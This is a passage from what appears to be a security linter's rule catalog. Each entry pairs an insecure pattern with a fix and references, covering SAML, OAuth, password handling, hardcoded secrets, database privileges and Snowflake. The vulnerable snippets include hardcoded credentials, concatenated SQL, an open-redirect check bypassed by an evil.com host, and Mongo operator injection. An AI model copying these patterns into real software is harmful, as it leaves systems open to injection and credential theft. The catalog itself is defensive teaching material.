		explanation: "XML Signature Wrapping (XSW) moves a validly signed element elsewhere in the document so the app reads attacker-injected content while signature verification still passes over the original. Enable all three protections together — InResponseTo validation plus signed response and signed assertions — to close the XSW attack surface.",
		references: ["CWE-347", "OASIS SAML 2.0 Core", "OWASP SAML Security Cheat Sheet"]
	},
	"SAML_XSW_XPATH_RISK": {
		pattern: "const el = doc.getElementsByTagName('Assertion')[0] // element selected without verifying its signature",
		fix: "// verify the signature on the exact element you consume:\nconst sig = new xmldsig.SignedXml();\nsig.loadSignature(signatureNode);\nif (!sig.checkSignature(xml) || sig.getReferences()[0].xpath !== assertionXPath) throw new Error('XSW');\n// only then read attributes from the verified assertion",
		explanation: "Selecting a SAML element with getElementsByTagName and trusting its content without confirming the signature covers that exact node is the core of XML Signature Wrapping. Verify the XML signature on the specific element you extract attributes from, using a library (xml-crypto) that binds the signature reference to the consumed node.",
		references: ["CWE-347", "OWASP SAML Security Cheat Sheet", "OASIS SAML 2.0 Core"]
	},

	// -------------------------------------------------------------------------
	// OAuth
	// -------------------------------------------------------------------------
	"OAUTH_CLIENT_SECRET_HARDCODED": {
		pattern: "const client = new OAuth2({ clientSecret: 'abc123secret' }) // secret in source / bundle",
		fix: "const client = new OAuth2({ clientSecret: process.env.OAUTH_CLIENT_SECRET }); // server-side only\n// public/mobile clients: use PKCE with no client secret at all",
		explanation: "A hardcoded OAuth client_secret is extractable from git history, Docker layers, and (for SPA/mobile builds) the shipped bundle, letting an attacker impersonate the client. Load it from a server-side environment variable or secrets manager, and for public clients use PKCE instead of a secret.",
		references: ["CWE-798", "RFC 6749", "RFC 7636", "OWASP ASVS 3.5.2"]
	},
	"OAUTH_CODE_REUSE": {
		pattern: "const tokens = await exchange(code) // authorization code never marked used",
		fix: "const rec = await db.authCodes.findUnique({ where: { code } });\nif (!rec || rec.usedAt) throw new Error('invalid or reused code');\nawait db.authCodes.update({ where: { code }, data: { usedAt: new Date() } });\nconst tokens = await exchange(code);",
		explanation: "OAuth authorization codes must be single-use (RFC 6749 §4.1.2); if a code is not invalidated at exchange, a replayed code mints a second set of tokens for an attacker who intercepted it. Atomically mark the code used at exchange time and reject any later presentation.",
		references: ["CWE-294", "RFC 6749", "OAuth 2.0 Security BCP (RFC 9700)"]
	},
	"OAUTH_IMPLICIT_FLOW": {
		pattern: "authorize({ response_type: 'token' }) // access token returned in URL fragment",
		fix: "authorize({ response_type: 'code', code_challenge, code_challenge_method: 'S256' });\n// exchange code for tokens at the token endpoint",
		explanation: "The implicit flow returns access tokens in the URL fragment, where they leak through browser history, Referer headers, and logs. It is deprecated by the OAuth 2.0 Security BCP. Use the authorization-code flow with PKCE (S256) for all public clients and SPAs.",
		references: ["CWE-319", "RFC 9700", "RFC 7636", "OAuth 2.1"]
	},
	"OAUTH_IMPLICIT_FLOW_PRODUCTION": {
		pattern: "response_type=token in production client config // tokens exposed in the URL",
		fix: "response_type=code with code_challenge_method=S256; disable the implicit grant on the client registration.",
		explanation: "Running the implicit grant in production exposes access tokens in URL fragments to history, Referer, and log capture. Disable the implicit grant for production clients and use authorization-code + PKCE, exchanging the code for tokens server-side or via the token endpoint.",
		references: ["CWE-319", "RFC 9700", "RFC 7636", "OAuth 2.1"]
	},
	"OAUTH_MISSING_STATE": {
		pattern: "authorize({ response_type: 'code', client_id }) // no state parameter",
		fix: "const state = crypto.randomBytes(32).toString('hex');\nreq.session.oauthState = state;\nauthorize({ response_type: 'code', client_id, state });\n// on callback: if (req.query.state !== req.session.oauthState) throw new Error('CSRF');",
		explanation: "Without a state parameter bound to the user's session, the authorization callback is open to CSRF — an attacker can inject their own authorization code into the victim's session (login CSRF / account linking). Generate a cryptographically random state, store it in the session, and verify it exactly on the callback.",
		references: ["CWE-352", "RFC 6749", "RFC 9700", "OWASP CSRF Prevention Cheat Sheet"]
	},
	"OAUTH_OPEN_REDIRECT_URI": {
		pattern: "if (redirectUri.startsWith('https://example.com')) allow // matches example.com.evil.com",
		fix: "const REGISTERED = new Set(['https://app.example.com/callback']);\nif (!REGISTERED.has(redirectUri)) throw new Error('invalid redirect_uri');",
		explanation: "Validating redirect_uri with includes/startsWith allows an attacker-controlled host like https://example.com.evil.com/ to pass, redirecting the authorization code to the attacker (open redirect / token theft). Compare redirect_uri with exact string equality against a pre-registered allowlist.",
		references: ["CWE-601", "RFC 6749", "RFC 9700", "OWASP Unvalidated Redirects Cheat Sheet"]
	},

	// -------------------------------------------------------------------------
	// Passwords / accounts
	// -------------------------------------------------------------------------
	"PASSWORD_PLAIN_COMPARE": {
		pattern: "if (password === user.password) { /* login */ } // plaintext compare, no hashing",
		fix: "const valid = await argon2.verify(user.passwordHash, password); // or bcrypt.compare()\nif (!valid) throw new Error('Invalid credentials');",
		explanation: "Comparing passwords with === means passwords are stored in plaintext and the comparison leaks timing information. Store only a strong password hash (Argon2id/bcrypt) and verify with the library's constant-time verify/compare function.",
		references: ["CWE-256", "CWE-916", "NIST SP 800-63B", "OWASP ASVS 2.4.1"]
	},
	"PASSWORD_RESET_NOT_SINGLE_USE": {
		pattern: "if (user.resetToken === token) { updatePassword() } // token not invalidated after use",
		fix: "await db.users.update({ where: { id: user.id }, data: { passwordHash, resetToken: null, resetTokenExpiry: null } });\n// clearing the token in the same update makes it single-use",
		explanation: "A reset token that stays valid after a successful reset can be replayed to change the password again — permanent account takeover if the token leaks. Delete/null the reset token in the same transaction that updates the password so it can be used exactly once.",
		references: ["CWE-640", "OWASP Forgot Password Cheat Sheet", "OWASP ASVS 2.5.1"]
	},
	"PASSWORD_RESET_NO_EXPIRY": {
		pattern: "if (user.resetToken === token) { updatePassword() } // no expiry check",
		fix: "if (!user.resetTokenExpiry || user.resetTokenExpiry < Date.now()) throw new Error('reset token expired');\n// issue with: resetTokenExpiry = Date.now() + 60 * 60 * 1000  (<= 1 hour)",
		explanation: "A reset token with no expiry stays valid forever, so a token captured from a breached database or an old email grants permanent account takeover. Enforce a short lifetime (<= 1 hour), store the expiry, and reject expired tokens — and invalidate the token on first use.",
		references: ["CWE-640", "OWASP Forgot Password Cheat Sheet", "OWASP ASVS 2.5.1"]
	},
	"ACCOUNT_ENUMERATION": {
		pattern: "if (!user) throw new Error('No such user'); if (!ok) throw new Error('Wrong password');",
		fix: "// identical response for both cases:\nif (!user || !(await argon2.verify(user.passwordHash, password))) throw new Error('Invalid credentials');\n// return the same status/timing regardless of which failed",
		explanation: "Distinct error messages (or response times) for 'user not found' versus 'wrong password' let an attacker enumerate which accounts exist, seeding credential-stuffing and phishing. Return the same generic error and equivalent timing for both failure modes on login, registration, and password-reset endpoints.",
		references: ["CWE-203", "CWE-204", "OWASP ASVS 2.2.1", "NIST SP 800-63B"]
	},
	"ACCOUNT_LOCKOUT_MISSING": {
		pattern: "if (await verify(password, user.hash)) login(); else return 401; // no failed-attempt counter",
		fix: "if (user.lockoutUntil && user.lockoutUntil > Date.now()) return res.status(423).send('locked');\nif (!(await argon2.verify(user.hash, password))) {\n  const failed = user.failedAttempts + 1;\n  const data = failed >= 5 ? { failedAttempts: failed, lockoutUntil: Date.now() + 15 * 60 * 1000 } : { failedAttempts: failed };\n  await db.users.update({ where: { id: user.id }, data });\n  return res.status(401).send('Invalid credentials');\n}\nawait db.users.update({ where: { id: user.id }, data: { failedAttempts: 0, lockoutUntil: null } });",
		explanation: "Rate limiting per IP does not stop distributed credential stuffing across many IPs against a single account. Track failed login attempts per account and lock the account after a threshold (e.g. 5 attempts) for a cool-down window, resetting the counter on a successful login. Combine with per-IP rate limiting and MFA for defense in depth.",
		references: ["CWE-307", "NIST SP 800-53 IA-5(1)", "OWASP ASVS 2.2.1", "NIST SP 800-63B"]
	},
	"ACCOUNT_LINKING_NO_REAUTH": {
		pattern: "app.post('/link/:provider', (req) => linkIdentity(req.user, req.body)) // no re-auth before linking",
		fix: "if (!req.session.reauthenticatedAt || Date.now() - req.session.reauthenticatedAt > 5 * 60 * 1000)\n  return res.status(403).send('Re-authentication required');\nawait linkIdentity(req.user, req.body); // step-up (password re-entry or MFA) first",
		explanation: "Linking a new federated identity without a fresh re-authentication lets a CSRF or a hijacked session attach an attacker-controlled IdP identity, giving the attacker a permanent alternate login. Require a recent re-authentication or MFA step-up before linking any identity.",
		references: ["CWE-287", "CWE-306", "OWASP ASVS 2.2.4", "NIST SP 800-63B"]
	},

	// -------------------------------------------------------------------------
	// Secrets
	// -------------------------------------------------------------------------
	"SECRET_ATLASSIAN_API_TOKEN": {
		pattern: "const jiraToken = 'ATATT3xFfGF0...' // Atlassian API token in source",
		fix: "const jiraToken = process.env.ATLASSIAN_API_TOKEN; // from a secrets manager\n// revoke the leaked token at id.atlassian.com/manage-profile/security/api-tokens",
		explanation: "An Atlassian/Jira API token committed to source grants API access to Jira/Confluence to anyone who reads the repo or its history. Revoke the token immediately, issue a replacement, store it in a secrets manager referenced via env var, and audit Jira/Confluence logs for misuse.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_CLIENT_EXPOSED_API_KEY": {
		pattern: "// client component\nfetch('https://api.vendor.com', { headers: { Authorization: 'Bearer sk_live_...' } })",
		fix: "// browser calls YOUR server route; the key stays server-side\nawait fetch('/api/proxy', { method: 'POST', body });\n// server: const key = process.env.VENDOR_API_KEY; rotate any key that shipped to the client",
		explanation: "A server/private API key embedded in client-exposed frontend code is visible to every visitor via dev-tools or the bundle, and is billed to and abused under your account. Proxy the call through a server route that holds the key in a server-only env var, and rotate any key that ever shipped to the browser.",
		references: ["CWE-798", "OWASP A02:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_CLOUDFLARE_API_TOKEN": {
		pattern: "const cf = new Cloudflare({ token: 'v1.0-abc...deadbeef' }) // token in source",
		fix: "const cf = new Cloudflare({ token: process.env.CLOUDFLARE_API_TOKEN });\n// rotate the token in the Cloudflare dashboard and scope it to the minimum zones/permissions",
		explanation: "A Cloudflare API token in source lets anyone with the code manage DNS, WAF, and zones, enabling traffic hijacking. Roll the token in the Cloudflare dashboard, scope the replacement to only the required zones and permissions (not a global API key), and load it from a secret manager at runtime.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_CONCATENATION_SUSPICIOUS": {
		pattern: "const key = 'sk_' + 'live_' + '51H' + 'abc...' // split-string obfuscation",
		fix: "const key = process.env.STRIPE_SECRET_KEY; // load from a secret manager; rotate the split literal",
		explanation: "Splitting or concatenating a secret across string fragments does not hide it — the value is trivially reconstructed from source and is still committed to git history. Treat it as a hardcoded secret: rotate it and load the real value from a secret manager via an environment variable.",
		references: ["CWE-798", "CWE-656", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_CONTAINER_REGISTRY_PASSWORD": {
		pattern: "docker login registry.example.com -u ci -p 'S3cretRegPass' // inline registry password",
		fix: "echo \"$REGISTRY_PASSWORD\" | docker login registry.example.com -u ci --password-stdin\n// inject REGISTRY_PASSWORD from a secret manager; prefer short-lived OIDC registry tokens",
		explanation: "A container registry password passed inline (or committed in .docker/config.json) leaks push/pull access to your images, enabling supply-chain tampering. Rotate the credential, feed it via --password-stdin from a secret manager or use short-lived OIDC tokens, and gitignore ~/.docker/config.json.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_DB_URL_PASSWORD_IN_TEMPLATE": {
		pattern: "# .env.example\nDATABASE_URL=postgres://admin:R3alP@ss@db.prod.internal:5432/app",
		fix: "# .env.example — placeholders only, never a real credential\nDATABASE_URL=postgres://USER:PASSWORD@HOST:5432/DBNAME\n// rotate the credential if a real one was ever committed to the template/docs",
		explanation: "A real database password committed inside a .env.example, docs, or template file is still a leaked credential — templates are frequently scraped and copied. Keep only placeholder values in example/template files, load the real URL from a secret manager, and rotate any credential that appeared in a committed template.",
		references: ["CWE-798", "CWE-312", "OWASP A05:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_DIST_NOT_SCANNED": {
		pattern: "# dist/ excluded from the secret scan — build tools may inline secrets",
		fix: "// scan compiled output for high-confidence patterns in CI:\ngitleaks detect --source dist/ --no-git\n// and verify no secret is inlined via webpack DefinePlugin / Vite `define`",
		explanation: "Build tools like webpack DefinePlugin and Vite `define` substitute env values into the compiled bundle, so a secret can end up in dist/ even when the source is clean. Add a targeted secret scan of the compiled output in CI and confirm no secret is inlined at build time.",
		references: ["CWE-540", "CWE-200", "OWASP A05:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_FIREBASE_WEB_CONFIG": {
		pattern: "const firebaseConfig = { apiKey: 'AIza...', authDomain: '...' } // verify it is not used for privileged auth",
		fix: "// the Firebase Web API key is not a secret, BUT you must lock down access:\n// 1) enforce Firebase Security Rules requiring request.auth\n// 2) restrict the API key in Google Cloud Console (HTTP referrers + API allowlist)\n// 3) enable Firebase App Check\nmatch /users/{uid} { allow read, write: if request.auth != null && request.auth.uid == uid; }",
		explanation: "The Firebase Web API config key is designed to be public, so exposure itself is not the vulnerability — the risk is relying on it for security. Protect data with restrictive Security Rules that require authentication, restrict the API key by referrer/API in Google Cloud Console, and enable App Check so only your app can call the backend.",
		references: ["CWE-306", "CWE-862", "OWASP A01:2021", "Firebase Security Rules docs"]
	},
	"SECRET_KEY_IN_COMMENT": {
		pattern: "// const AES_KEY = '4f3c...deadbeef'; // old key, kept for reference",
		fix: "// remove the comment entirely and rotate the key — it is still in git history\nconst key = Buffer.from(process.env.AES_KEY_HEX!, 'hex');",
		explanation: "Commenting out a key does not protect it: the value remains in the file and in git history and is recoverable by anyone. Treat any key that ever appeared in the repo (even commented) as compromised — rotate it, re-key affected data, and store keys in a KMS/secret manager.",
		references: ["CWE-798", "CWE-615", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_MANAGER_NOT_DETECTED": {
		pattern: "// secrets read from committed .env / hardcoded literals; no secret manager in use",
		fix: "// AWS example:\nimport { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';\nconst sm = new SecretsManagerClient({});\nconst { SecretString } = await sm.send(new GetSecretValueCommand({ SecretId: 'prod/app' }));\nconst secrets = JSON.parse(SecretString!);",
		explanation: "No secret-manager usage was detected, which usually means secrets live in committed env files, CI variables, or hardcoded literals — all exposed in source, logs, and images. Integrate a secret manager (AWS Secrets Manager/SSM, GCP Secret Manager, Azure Key Vault, or HashiCorp Vault) with workload identity, and fetch secrets at runtime.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5", "NIST SP 800-57 Part 1"]
	},
	"SECRET_OPENSSH_PRIVATE_KEY": {
		pattern: "# an id_ed25519 / server.pem OpenSSH private-key file committed to the repo (PEM 'BEGIN … KEY' header + body)",
		fix: "# remove it from source and rotate the key pair:\nssh-keygen -t ed25519 -f ~/.ssh/id_ed25519_new\n# deploy the new public key, remove the old one from every authorized_keys and CI system\n# store private keys in a secret manager, never in the repo",
		explanation: "An OpenSSH private key in source grants anyone with the repo access to every host that trusts its public key. Rotate the key pair immediately, revoke the old public key from all authorized_keys files and CI systems, purge it from git history, and keep private keys in a dedicated key store or secret manager.",
		references: ["CWE-798", "CWE-321", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"SECRET_WEBHOOK_SIGNING_SECRET": {
		pattern: "const WEBHOOK_SECRET = '<hardcoded provider webhook signing secret>' // secret literal in source",
		fix: "const secret = process.env.STRIPE_WEBHOOK_SECRET;\nconst event = stripe.webhooks.constructEvent(rawBody, sig, secret); // verifies signature + timestamp\n// rotate the leaked signing secret in the provider dashboard",
		explanation: "A leaked webhook signing secret lets an attacker forge signed webhook payloads and trigger your handlers as if they came from the provider. Rotate it in the provider dashboard (Stripe/GitHub/etc.), load it from a secret manager, and verify inbound webhooks with a timestamp tolerance to block replay.",
		references: ["CWE-798", "CWE-347", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},

	// -------------------------------------------------------------------------
	// Hardcoded credentials / infra values
	// -------------------------------------------------------------------------
	"HARDCODED_CREDENTIALS": {
		pattern: "const password = 'Sup3rS3cret!' // credential literal in source",
		fix: "const password = process.env.APP_PASSWORD; // from a secrets manager; rotate the leaked value",
		explanation: "A credential literal in source is extractable from git history even after removal and is routinely scraped by automated tooling. Move all secrets to environment variables backed by a secret manager and rotate any credential that was ever committed.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"HARDCODED_DB_URL_OR_API_KEY": {
		pattern: "const config = { databaseUrl: 'postgres://admin:R3alP@ss@db/app', apiKey: 'AKIA...' }",
		fix: "const config = { databaseUrl: process.env.DATABASE_URL, apiKey: process.env.API_KEY };\n// rotate any credential that appeared in source",
		explanation: "A database URL with an embedded password or an API key literal in a config object is captured in git history even after deletion and is frequently harvested by scanners. Read these values from environment variables injected by a secret manager at runtime, and rotate exposed credentials.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"HARDCODED_IP_ADDRESS": {
		pattern: "const dbHost = '10.0.4.17' // hardcoded internal IP in production code",
		fix: "const dbHost = process.env.DB_HOST; // DNS name or env-injected value; use 0.0.0.0 only for bind addresses",
		explanation: "A hardcoded IP exposes internal network topology (aiding reconnaissance and pivot targeting), breaks across environments, and goes stale without code changes. Reference services by environment variable or DNS name resolved at runtime; reserve 0.0.0.0 for bind addresses only.",
		references: ["CWE-1188", "MITRE ATT&CK T1592.002", "NIST SP 800-53 CM-6"]
	},
	"HARDCODED_JWT_SECRET": {
		pattern: "jwt.sign(payload, 'my-jwt-secret') // signing secret literal in source",
		fix: "jwt.sign(payload, process.env.JWT_SECRET!, { algorithm: 'HS256', expiresIn: '1h' });\n// prefer RS256 with a private key from a KMS; rotate the leaked secret",
		explanation: "A hardcoded JWT signing secret is trivially extracted from git history and Docker images, after which an attacker can forge valid tokens for any user. Load the secret from an environment variable or secrets manager (or use RS256 with a KMS-held private key), and rotate any secret that was committed.",
		references: ["CWE-798", "CWE-321", "OWASP A07:2021", "RFC 8725"]
	},

	// -------------------------------------------------------------------------
	// Databases
	// -------------------------------------------------------------------------
	"DB_ADMIN_CREDENTIALS": {
		pattern: "postgres://postgres:postgres@db:5432/app // superuser in the app connection string",
		fix: "// create a least-privilege role and use it in the app:\n// CREATE ROLE app_user LOGIN PASSWORD '...';\n// GRANT SELECT, INSERT, UPDATE, DELETE ON app.orders, app.users TO app_user;\npostgres://app_user:${process.env.DB_PASSWORD}@db:5432/app",
		explanation: "Connecting the application with a root/admin/sa/postgres superuser means any SQL injection or compromise runs with full DDL and cross-database power. Create a dedicated least-privilege role scoped to only the tables and operations the app needs, and never use superuser credentials in application code.",
		references: ["CWE-250", "CWE-269", "NIST SP 800-53 AC-6", "PCI DSS 4.0 Req 7.2"]
	},
	"DB_BACKUP_NOT_ENCRYPTED": {
		pattern: "resource \"aws_db_instance\" \"main\" { /* storage_encrypted not set */ }",
		fix: "resource \"aws_db_instance\" \"main\" {\n  storage_encrypted = true\n  kms_key_id        = aws_kms_key.rds.arn\n}\n// snapshots inherit encryption from the encrypted source instance",
		explanation: "Unencrypted database backups/snapshots expose all data at rest if the backup storage is accessed or exfiltrated. Enable encryption with a managed KMS key on the instance so automated and manual snapshots are encrypted, and restrict access to the KMS key.",
		references: ["CWE-311", "NIST SP 800-53 SC-28", "PCI DSS 4.0 Req 3.5", "FIPS 140-3"]
	},
	"DB_DYNAMIC_SQL_CONCAT": {
		pattern: "EXECUTE IMMEDIATE 'SELECT * FROM t WHERE id = ' || p_input; -- stored-proc SQL injection",
		fix: "-- Oracle: bind the parameter\nEXECUTE IMMEDIATE 'SELECT * FROM t WHERE id = :1' USING p_input;\n-- SQL Server: sp_executesql with typed params\nEXEC sp_executesql N'SELECT * FROM t WHERE id = @id', N'@id int', @id = @id;",
		explanation: "Building dynamic SQL by concatenation inside a stored procedure runs injected SQL with the procedure's (often elevated) privileges. Use parameterized dynamic SQL — bind variables (USING) in Oracle, sp_executesql typed parameters in SQL Server — and allowlist any dynamic identifiers.",
		references: ["CWE-89", "OWASP A03:2021", "NIST SP 800-53 SI-10", "OWASP ASVS 5.3.4"]
	},
	"DB_GRANT_PRIVILEGE_ESCALATION": {
		pattern: "GRANT ALL PRIVILEGES ON app.* TO app_role WITH GRANT OPTION; -- over-broad + re-delegatable",
		fix: "GRANT SELECT, INSERT, UPDATE ON app.orders TO app_role; -- named privileges, named objects\n-- omit WITH GRANT OPTION; revoke existing over-broad grants",
		explanation: "GRANT ALL and WITH GRANT OPTION let a role hold far more privilege than it needs and re-delegate privileges to others, creating an uncontrolled grant chain and privilege escalation. Grant only the specific privileges required on named objects and never attach WITH GRANT OPTION to application roles.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "PCI DSS 4.0 Req 7.2"]
	},
	"DB_HARDCODED_PASSWORD": {
		pattern: "new Pool({ user: 'app', password: 'R3alP@ss', host: 'db' }) // password literal",
		fix: "new Pool({ user: 'app', password: process.env.DB_PASSWORD, host: process.env.DB_HOST });\n// rotate the exposed password",
		explanation: "A hardcoded database password in ORM/DB config is exposed in source, git history, and images. Load DB credentials from environment variables backed by a secret manager, and rotate any password that was committed.",
		references: ["CWE-798", "OWASP A07:2021", "NIST SP 800-53 IA-5"]
	},
	"DB_MONGO_OPERATOR_KEY_INJECTION": {
		pattern: "db.users.find({ [req.body.field]: req.body.value }) // attacker keys like $where/$ne/$gt",
		fix: "// validate the field against an allowlist and reject operator-shaped input:\nconst ALLOWED = new Set(['email', 'username']);\nif (!ALLOWED.has(req.body.field)) throw new Error('invalid field');\nconst value = String(req.body.value); // coerce to a string, never an object\ndb.users.find({ [req.body.field]: value });\n// and enable Mongoose `sanitizeFilter` / express-mongo-sanitize",
		explanation: "Using user input as object keys (or spreading req.body into a filter) lets an attacker inject MongoDB operators like $where, $ne, and $gt that change query semantics — authentication bypass and data exfiltration. Allowlist field names, coerce values to primitives so an object operator can't slip in, and use a sanitizer to strip $-prefixed keys.",
		references: ["CWE-943", "OWASP A03:2021", "NIST SP 800-53 SI-10"]
	},
	"DB_NO_POOL_LIMITS": {
		pattern: "new Pool({ host, user }) // no max/min — unbounded connections",
		fix: "new Pool({ host, user, max: 20, min: 2, idleTimeoutMillis: 30000, connectionTimeoutMillis: 5000 });",
		explanation: "A connection pool with no explicit limits can open unbounded connections, exhausting the database's connection slots and crashing it under load or via a deliberate DoS. Set max/min pool sizes and idle/acquire timeouts sized to your database's capacity.",
		references: ["CWE-770", "CWE-400", "NIST SP 800-53 SC-5", "OWASP A04:2021"]
	},
	"DB_PREPARED_STATEMENT_MISUSE": {
		pattern: "const stmt = db.prepare('SELECT * FROM users WHERE id = ' + req.params.id) // value concatenated",
		fix: "const stmt = db.prepare('SELECT * FROM users WHERE id = ?');\nstmt.get(req.params.id); // the placeholder carries the value",
		explanation: "Concatenating a value into a prepared statement's SQL text defeats the entire protection — the query is still injectable. The placeholder (?, $1, :name) must carry the user value as a bound parameter; never build the statement string from input.",
		references: ["CWE-89", "OWASP A03:2021", "NIST SP 800-53 SI-10", "OWASP ASVS 5.3.4"]
	},
	"DB_READ_UNCOMMITTED_ISOLATION": {
		pattern: "SELECT balance FROM accounts WITH (NOLOCK) -- dirty reads",
		fix: "SET TRANSACTION ISOLATION LEVEL READ COMMITTED; -- or REPEATABLE READ / SERIALIZABLE\nSELECT balance FROM accounts WHERE id = @id; -- remove NOLOCK hints",
		explanation: "READ UNCOMMITTED / WITH (NOLOCK) reads uncommitted, possibly rolled-back data and can return inconsistent or duplicated rows. On financial or authorization data this produces incorrect decisions and race-condition bugs. Use READ COMMITTED (default) or a stronger level for consistency-critical transactions and drop NOLOCK hints.",
		references: ["CWE-362", "NIST SP 800-53 SI-10", "OWASP A04:2021"]
	},
	"DB_RLS_POLICY_BYPASS": {
		pattern: "ALTER TABLE tenants DISABLE ROW LEVEL SECURITY; -- or SECURITY DEFINER fn with no search_path",
		fix: "ALTER TABLE tenants ENABLE ROW LEVEL SECURITY;\nALTER TABLE tenants FORCE ROW LEVEL SECURITY;\nCREATE FUNCTION f() ... SECURITY DEFINER SET search_path = pg_catalog, public; -- pin search_path",
		explanation: "Disabling/forgoing RLS or granting BYPASSRLS to the app role removes tenant isolation, and a SECURITY DEFINER routine without a pinned search_path lets a caller shadow objects and run code as the definer (privilege escalation). Keep RLS enabled and forced on tenant tables, and set a fixed search_path on every SECURITY DEFINER function.",
		references: ["CWE-863", "CWE-269", "NIST SP 800-53 AC-3", "PostgreSQL RLS docs"]
	},

	// -------------------------------------------------------------------------
	// Snowflake
	// -------------------------------------------------------------------------
	"SNOWFLAKE_BROAD_PRIVILEGE_GRANT": {
		pattern: "GRANT MANAGE GRANTS ON ACCOUNT TO ROLE analyst; -- lets a role re-grant any privilege",
		fix: "-- keep MANAGE GRANTS with SECURITYADMIN only; grant least privilege to functional roles\nGRANT SELECT ON DATABASE analytics TO ROLE analyst;\n-- never grant APPLY MASKING POLICY / APPLY ROW ACCESS POLICY to PUBLIC or generic roles",
		explanation: "Granting MANAGE GRANTS broadly lets a role re-grant any privilege to anyone (privilege escalation), and broad IMPORTED PRIVILEGES or APPLY MASKING POLICY grants let a role read shared data or remove data masking. Restrict these meta-privileges to a small audited set of admin roles and grant only least-privilege object access to functional roles.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Snowflake Access Control docs", "PCI DSS 4.0 Req 7.2"]
	},
	"SNOWFLAKE_DATA_RETENTION_ZERO": {
		pattern: "ALTER TABLE sensitive SET DATA_RETENTION_TIME_IN_DAYS = 0; -- Time Travel disabled",
		fix: "ALTER TABLE sensitive SET DATA_RETENTION_TIME_IN_DAYS = 7; -- Enterprise: up to 90\n-- combine with fail-safe and external backups for regulated data",
		explanation: "DATA_RETENTION_TIME_IN_DAYS = 0 disables Time Travel, so there is no recovery from an accidental or malicious DROP/TRUNCATE/UPDATE. Set retention to at least 7 days (up to 90 on Enterprise) on sensitive tables/databases and pair it with fail-safe and external backups.",
		references: ["CWE-693", "NIST SP 800-53 CP-9", "Snowflake Time Travel docs"]
	},
	"SNOWFLAKE_DATA_SHARE_OR_EXTERNAL_STAGE": {
		pattern: "CREATE STAGE s URL='s3://bucket' CREDENTIALS=(AWS_KEY_ID='AKIA...' AWS_SECRET_KEY='...');",
		fix: "CREATE STORAGE INTEGRATION s3_int TYPE=EXTERNAL_STAGE STORAGE_PROVIDER='S3'\n  STORAGE_AWS_ROLE_ARN='arn:aws:iam::123:role/snowflake' STORAGE_ALLOWED_LOCATIONS=('s3://bucket/prefix/');\nCREATE STAGE s URL='s3://bucket/prefix/' STORAGE_INTEGRATION=s3_int;\n-- review every CREATE/ALTER SHARE; share minimum objects with named accounts only",
		explanation: "Embedding AWS keys in a stage exposes long-lived cloud credentials in SQL/history, and unreviewed shares can leak data to unintended accounts. Use a STORAGE INTEGRATION bound to an IAM role instead of inline keys, rotate any committed keys, and enforce REQUIRE_STORAGE_INTEGRATION_FOR_STAGE_CREATION = TRUE.",
		references: ["CWE-798", "CWE-668", "NIST SP 800-53 AC-4", "Snowflake Storage Integration docs"]
	},
	"SNOWFLAKE_DEFAULT_SECONDARY_ROLES_ALL": {
		pattern: "ALTER USER svc SET DEFAULT_SECONDARY_ROLES = ('ALL'); -- every granted role active at login",
		fix: "ALTER USER svc SET DEFAULT_SECONDARY_ROLES = (); -- none active by default\n-- require explicit: USE ROLE app_role; USE SECONDARY ROLES ...; for privileged actions",
		explanation: "DEFAULT_SECONDARY_ROLES = ('ALL') activates every role a user holds simultaneously at login, so a compromised session immediately wields the union of all granted privileges. For privileged or service users, disable default-all secondary roles and require explicit USE ROLE / USE SECONDARY ROLES so elevated actions are intentional.",
		references: ["CWE-269", "NIST SP 800-53 AC-6", "Snowflake Secondary Roles docs"]
	},
	"SNOWFLAKE_DYNAMIC_SQL_CONCAT": {
		pattern: "EXECUTE IMMEDIATE 'SELECT * FROM t WHERE id = ' || :arg; -- stored-proc SQL injection",
		fix: "-- bind the value:\nlet stmt = snowflake.createStatement({ sqlText: 'SELECT * FROM t WHERE id = ?', binds: [ARG] });\n-- or SQL: EXECUTE IMMEDIATE 'SELECT ... WHERE id = ?' USING (arg);\n-- wrap identifiers with IDENTIFIER() or an allowlist; prefer EXECUTE AS CALLER",
		explanation: "Concatenating arguments into EXECUTE IMMEDIATE/sqlText lets a crafted argument alter the executed statement, and with EXECUTE AS OWNER it escalates to the procedure owner's privileges. Use bind variables (USING / binds), validate identifiers via IDENTIFIER() or an allowlist, and prefer EXECUTE AS CALLER for procedures that build dynamic SQL.",
		references: ["CWE-89", "OWASP A03:2021", "NIST SP 800-53 SI-10", "Snowflake Stored Procedure docs"]
	},
	"SNOWFLAKE_EXTERNAL_FUNCTION_UNTRUSTED": {
		pattern: "CREATE API INTEGRATION api API_ALLOWED_PREFIXES=('https://') ...; -- wildcard endpoint",
		fix: "CREATE API INTEGRATION api\n  API_ALLOWED_PREFIXES=('https://api.example.com/prod/')  -- exact https prefix\n  API_AWS_ROLE_ARN='arn:aws:iam::123:role/snowflake-ef' ENABLED=TRUE;\n-- external functions exfiltrate row data on every call; review carefully",
		explanation: "An external function or API integration pointed at an http:// or wildcard endpoint sends row data to an untrusted destination on every call, an exfiltration channel. Restrict API_ALLOWED_PREFIXES to exact https endpoints, bind the integration to a dedicated least-privilege cloud role, and review which roles can create/call external functions.",
		references: ["CWE-676", "CWE-829", "NIST SP 800-53 AC-4", "Snowflake External Functions docs"]
	},
	"SNOWFLAKE_HARDCODED_CONNECTION": {
		pattern: "conn = snowflake.connector.connect(account='xy12345', user='svc', password='R3alP@ss')",
